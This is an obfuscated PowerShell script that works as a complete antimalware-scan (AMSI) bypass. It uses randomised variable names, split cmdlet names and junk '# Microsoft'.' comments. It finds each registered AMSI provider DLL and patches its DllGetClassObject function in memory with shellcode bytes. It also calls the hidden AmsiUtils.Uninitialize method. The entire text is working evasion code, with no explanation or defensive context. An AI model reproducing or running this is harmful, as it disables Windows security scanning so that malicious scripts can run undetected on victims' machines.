# Microsoft".
# Microsoft".

# Microsoft".
# Microsoft".
# Microsoft".

# Microsoft".

function Get-ProcAddress {
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [String] $FfrSgmZRMXZylMuNmAyWmQAVhcRUjvBUEqjji,
        [Parameter(Position = 1, Mandatory = $True)] [String] $wHonKfLPOvTtEaTGCavVnySV
    )

    # Microsoft".
    $cZpvXnWSrzkykEFMEmnE = [AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $zqxisORZKnoiQBcurndAbroTHuasYmr = $cZpvXnWSrzkykEFMEmnE.GetType('Microsoft.Win32.UnsafeNativeMethods')
    # Microsoft".
    $ffAnezxeskpqwxACChkKMRJepUduQTFEmaqFWsinQepDy = $zqxisORZKnoiQBcurndAbroTHuasYmr.GetMethod('GetModuleHandle')
    $dbSFhBfzJUljFssvfwMfQIoKpDwFEjekHkxKIHut = $zqxisORZKnoiQBcurndAbroTHuasYmr.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
    # Microsoft".
    $nRIqgYjmEIdgXTOxyRJqaqhmkNCkJybny = $ffAnezxeskpqwxACChkKMRJepUduQTFEmaqFWsinQepDy.Invoke($null, @($FfrSgmZRMXZylMuNmAyWmQAVhcRUjvBUEqjji))
    $qqjEuojXWeTLWkBQvLycCLTaU = ne`w`-ob`ject IntPtr
    $LGyjrGpdlKCYSzIfgtmMyiJvXOjNQCSOtcPtk = ne`w`-ob`ject System.Runtime.InteropServices.HandleRef($qqjEuojXWeTLWkBQvLycCLTaU, $nRIqgYjmEIdgXTOxyRJqaqhmkNCkJybny)
    # Microsoft".
    return $dbSFhBfzJUljFssvfwMfQIoKpDwFEjekHkxKIHut.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$LGyjrGpdlKCYSzIfgtmMyiJvXOjNQCSOtcPtk, $wHonKfLPOvTtEaTGCavVnySV))
}
function Get-DelegateType
{
    Param
    (
        [OutputType([Type])]
            
        [Parameter( Position = 0)]
        [Type[]]
        $YiAGcMHhaaJavvwFmIwrJrTGeyRQpU = (ne`w`-ob`ject Type[](0)),
            
        [Parameter( Position = 1 )]
        [Type]
        $sSBoHWOFLynOvuctGQhQlNOsKfZxELlDGYnzGE = [Void]
    )

    $QmthEyDJTOjRawpBmUWbymkrKzGSxKFLGKIGFHM = [AppDomain]::CurrentDomain
    $PbsPdnoceFtlarwjshYTmzTjQpoYK = ne`w`-ob`ject System.Reflection.AssemblyName('ReflectedDelegate')
    $tSqWVvMQGNAwEJxMwHYDZY = $QmthEyDJTOjRawpBmUWbymkrKzGSxKFLGKIGFHM.DefineDynamicAssembly($PbsPdnoceFtlarwjshYTmzTjQpoYK, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $cCnIyKHdkQcubMmXKisRXqc = $tSqWVvMQGNAwEJxMwHYDZY.DefineDynamicModule('InMemoryModule', $false)
    $fwjmCxPirWwuqEJcOZtYLqLnVoNfPbTxZo = $cCnIyKHdkQcubMmXKisRXqc.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $QndjglhtjLJMMBrpfrbEpxDbwZZeBIQX = $fwjmCxPirWwuqEJcOZtYLqLnVoNfPbTxZo.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $YiAGcMHhaaJavvwFmIwrJrTGeyRQpU)
    $QndjglhtjLJMMBrpfrbEpxDbwZZeBIQX.SetImplementationFlags('Runtime, Managed')
    $YMjpXwjVCCMySvJAdjFUic = $fwjmCxPirWwuqEJcOZtYLqLnVoNfPbTxZo.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $sSBoHWOFLynOvuctGQhQlNOsKfZxELlDGYnzGE, $YiAGcMHhaaJavvwFmIwrJrTGeyRQpU)
    $YMjpXwjVCCMySvJAdjFUic.SetImplementationFlags('Runtime, Managed')
        
    Write-Output $fwjmCxPirWwuqEJcOZtYLqLnVoNfPbTxZo.CreateType()
}
$GoEGXWBaAGlmdBLmOqwKNBIgCXinqSGmKjPEaId = Get-ProcAddress kernel32.dll LoadLibraryA
$XxASAWIEiKzmZpwwuiWxQMufOsRTIX = Get-DelegateType @([String]) ([IntPtr])
$etlVVlejTajjpDrBTIwkRjmw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GoEGXWBaAGlmdBLmOqwKNBIgCXinqSGmKjPEaId,
$XxASAWIEiKzmZpwwuiWxQMufOsRTIX)
$aSZjvSeRLDqBZnAUcKrhKHTtWcCakWqQCdXMtl = Get-ProcAddress kernel32.dll GetProcAddress
$JMfXdADHAXXbjkVorWHuilEiukBNjpCwWD = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
$dbSFhBfzJUljFssvfwMfQIoKpDwFEjekHkxKIHut = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($aSZjvSeRLDqBZnAUcKrhKHTtWcCakWqQCdXMtl,
$JMfXdADHAXXbjkVorWHuilEiukBNjpCwWD)
$TCiptibAHlfdkhZBITSicp = Get-ProcAddress kernel32.dll VirtualProtect
$wzaZZQVbYIuOYWGSMTJSyaOFWaHLwveDMLjEJd = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$VQlFQtSAXetybqvxTqrZZRVVSKJJxNgKsKZSRt = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($TCiptibAHlfdkhZBITSicp,
$wzaZZQVbYIuOYWGSMTJSyaOFWaHLwveDMLjEJd)

$meYQUYbTDQZfdVBVSrpuOllbeEPDoChcu = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
$MDNZurFQOFCSVdCcVwxVkDEZgiUIGtCska = 0

foreach ($MDNYOpccjHtiHdqRqBXObtRNFxHxXzoRmckVxtrsgg in Get-ChildItem  HKLM:\SOFTWARE\Microsoft\AMSI\Providers -Name)
{
    $rayeQUefxtjXUMOZhokW = 'HKLM:\Software\Classes\CLSID\' + $MDNYOpccjHtiHdqRqBXObtRNFxHxXzoRmckVxtrsgg + '\InprocServer32'
    $QTDhMeWMWubHjPTjyqKxuabZkjLUWCl = Get-ItemPropertyValue -Name '(Default)' $rayeQUefxtjXUMOZhokW -ErrorAction SilentlyContinue
    if ($QTDhMeWMWubHjPTjyqKxuabZkjLUWCl)
    {
        $CjlxKCXYnHmTPQigjHFaOAvEJWAGrkXgBViV = Split-Path $QTDhMeWMWubHjPTjyqKxuabZkjLUWCl -leaf
        $zgurKCggOTZhwEeZhzBwVCUpQrwzNZLdePHhmNbCUIvEX = $CjlxKCXYnHmTPQigjHFaOAvEJWAGrkXgBViV -replace '"', ""
        $krEQaRSxAYOgVbAgqQXCcCK = $etlVVlejTajjpDrBTIwkRjmw.Invoke($zgurKCggOTZhwEeZhzBwVCUpQrwzNZLdePHhmNbCUIvEX) 
        if ($krEQaRSxAYOgVbAgqQXCcCK -ne 0)
        {
            Write-host "[*] Provider found - " $CjlxKCXYnHmTPQigjHFaOAvEJWAGrkXgBViV
            $hFqXYAcetNzcCbGqQMUxpfXKMKlThHcABXxsRCwNjO = $dbSFhBfzJUljFssvfwMfQIoKpDwFEjekHkxKIHut.Invoke($krEQaRSxAYOgVbAgqQXCcCK, "DllGetClassObject")        
            $VQlFQtSAXetybqvxTqrZZRVVSKJJxNgKsKZSRt.Invoke($hFqXYAcetNzcCbGqQMUxpfXKMKlThHcABXxsRCwNjO, [uint32]$meYQUYbTDQZfdVBVSrpuOllbeEPDoChcu.Length, 0x40, [ref]$MDNZurFQOFCSVdCcVwxVkDEZgiUIGtCska)
            [System.Runtime.InteropServices.Marshal]::Copy($meYQUYbTDQZfdVBVSrpuOllbeEPDoChcu, 0, $hFqXYAcetNzcCbGqQMUxpfXKMKlThHcABXxsRCwNjO, $meYQUYbTDQZfdVBVSrpuOllbeEPDoChcu.Length)
        }
    }
}

$object = [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
$jFXFQMucMttCqeyUCYsrAunWdsbKvdBeABsDJOjgNZSF = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
$jFXFQMucMttCqeyUCYsrAunWdsbKvdBeABsDJOjgNZSF.Invoke($object,$null)
